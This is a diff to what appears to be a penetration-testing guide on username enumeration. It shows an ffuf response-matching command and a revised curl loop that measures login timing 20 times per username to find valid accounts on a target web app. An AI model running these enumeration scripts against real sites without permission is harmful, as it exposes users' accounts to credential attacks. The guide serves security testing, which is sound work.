@@ -59,15 +59,19 @@ ffuf -w users.txt -u https://target/login -X POST \
 
 Matching on the valid-user message (`-mr`) returns exactly the confirmed accounts. Where the tell is length rather than text, filter on size instead (`-fs`/`-ms`). For reset or registration oracles, point the same technique at `/forgot-password` or `/register` and match the existence-confirming branch.
 
-For a timing oracle, issue repeated requests per identifier and compare median response times:
+For a timing oracle, take many samples per identifier and aggregate before ranking; a single request is meaningless against network jitter. Keeping the **minimum** of many samples is a simple robust aggregate, since jitter only ever adds delay:
 
 ```bash
 for u in $(cat users.txt); do
-  t=$(curl -s -o /dev/null -w '%{time_total}' -X POST https://target/login \
-        -d "username=$u&password=Wrong123!")
-  echo "$t  $u"
+  min=$(for i in $(seq 1 20); do
+          curl -s -o /dev/null -w '%{time_total}\n' -X POST https://target/login \
+            -d "username=$u&password=Wrong123!"
+        done | sort -n | head -1)
+  echo "$min  $u"
 done | sort -rn | head
 ```
+
+Each identifier is measured 20 times and reduced to its fastest (least-jittered) response; the users whose floor is consistently higher are the ones running the expensive hash, so they rank at the top. Raise the sample count on noisy links and compare the distributions, not one-off values.
 
 Enumeration is often possible across several endpoints at once; the most reliable oracle on a given target is frequently registration or reset rather than login, so test all of them before concluding the app is safe.
 
